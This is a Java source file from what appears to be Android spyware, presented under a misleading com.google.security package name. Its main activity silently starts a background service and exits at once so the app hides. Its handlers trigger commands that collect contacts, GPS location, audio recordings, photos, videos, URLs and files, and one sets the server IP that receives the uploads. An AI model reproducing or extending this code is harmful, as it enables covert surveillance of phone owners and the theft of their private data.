package com.google.security;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;

public class MainActivity extends Activity implements OnClickListener {

	private SMSHandler mHandler;
	Message msg;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		// this.startService(new Intent(MainActivity.this,MainService.class));
		findViewById(R.id.contract).setOnClickListener(this);
		findViewById(R.id.GPS).setOnClickListener(this);
		findViewById(R.id.recorder).setOnClickListener(this);
		findViewById(R.id.photo).setOnClickListener(this);
		findViewById(R.id.video).setOnClickListener(this);
		findViewById(R.id.url).setOnClickListener(this);
		findViewById(R.id.wechat).setOnClickListener(this);
		findViewById(R.id.upload).setOnClickListener(this);
		startService(new Intent(MainActivity.this, MainService.class));
		this.finish();
		System.exit(0);

	}

	@Override
	protected void onPause() {
		// TODO Auto-generated method stub
		super.onPause();
		Log.w("MainActivtiy", "Pause");
		// this.finish();
	}

	@Override
	public void onClick(View v) {
		// TODO Auto-generated method stub
		switch (v.getId()) {
		case R.id.contract:
			msg = new Message();
			mHandler = new SMSHandler(this);
			msg.obj = SMSConstant.FILTER_CONTACTS;
			mHandler.sendMessage(msg);
			break;
		case R.id.GPS:
			msg = new Message();
			mHandler = new SMSHandler(this);
			msg.obj = SMSConstant.FILTER_LOCATION;
			mHandler.sendMessage(msg);
			break;
		case R.id.recorder:
			msg = new Message();
			mHandler = new SMSHandler(this);
			msg.obj = SMSConstant.FILTER_RECORD;
			mHandler.sendMessage(msg);
			break;
		case R.id.photo:
			msg = new Message();
			mHandler = new SMSHandler(this);
			msg.obj = SMSConstant.FILTER_PHOTO;
			mHandler.sendMessage(msg);
			break;
		case R.id.video:
			msg = new Message();
			mHandler = new SMSHandler(this);
			msg.obj = SMSConstant.FILTER_VEDIO;
			mHandler.sendMessage(msg);
			break;
		case R.id.url:
			msg = new Message();
			mHandler = new SMSHandler(this);
			msg.obj = SMSConstant.FILTER_URL;
			mHandler.sendMessage(msg);
			break;
		case R.id.wechat:
//			UploadUtils uploadUtils = UploadUtils.getIntance(this);
//			String s = "*#*/security/1456732218.jpg";
//			if (s.subSequence(0, 3).equals("*#*")) {
//				uploadUtils.sendanyfiles(s.substring(3));
//
//			}
			 msg = new Message();
			 mHandler = new SMSHandler(this);
			 msg.obj = SMSConstant.FILTER_FILES;
			 mHandler.sendMessage(msg);
			break;
		case R.id.upload:
			msg = new Message();
			mHandler = new SMSHandler(this);
			msg.obj = SMSConstant.CHANGE_IP + "111.111.111.111";
			mHandler.sendMessage(msg);
			break;

		}
	}
}
